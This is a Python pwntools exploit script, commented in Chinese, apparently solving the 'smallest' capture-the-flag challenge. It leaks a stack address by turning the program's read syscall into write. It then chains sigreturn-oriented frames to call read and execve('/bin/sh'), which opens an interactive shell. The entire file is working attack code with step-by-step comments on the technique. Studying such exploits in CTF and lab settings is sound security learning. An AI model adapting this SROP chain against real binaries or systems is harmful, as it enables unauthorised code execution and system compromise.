#coding:utf-8

from pwn import *
context(arch='amd64',os='linux',log_level='debug')
sh = process("./smallest")
syscall_ret = 0x00000000004000be
start_addr = 0x00000000004000b0
### 利用write,leak stack_addr
payload = p64(start_addr)*3#先构造三次跳转
sh.send(payload)
sh.send('\xb3')
#设置rax=1，即 将返回地址改为0x00000000004000b3即 跳过xor rax,rax,以保持rax=1
#使原有的read(0,rsp,400)变为write(1,rsp,400)
stack_addr = u64(sh.recv()[8:16])
log.success('leak stack addr:0x%x',stack_addr)
### 使用read将后续的payload写到栈地址上
sigframe = SigreturnFrame()
sigframe.rax=constants.SYS_read #read的系统调用号
sigframe.rdi =0 #参数1
sigframe.rsi = stack_addr #参数2
sigframe.rdx = 0x400 #参数3
sigframe.rsp = stack_addr #返回到栈上，也就是下面的sigreturn_addr
sigframe.rip = syscall_ret #syscall;ret
payload = p64(start_addr)+'a'*8+str(sigframe)
sh.send(payload)
### sigreturn_addr 控制输入字符为15，signal的系统调用号
sigreturn = p64(syscall_ret)+"b"*7
sh.send(sigreturn)
### execve("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(start_addr)+"b"*8+str(sigframe)
payload += '\x00'*(0x120-len(payload))+'/bin/sh\x00'
sh.send(payload)
sh.send(sigreturn)
sh.interactive()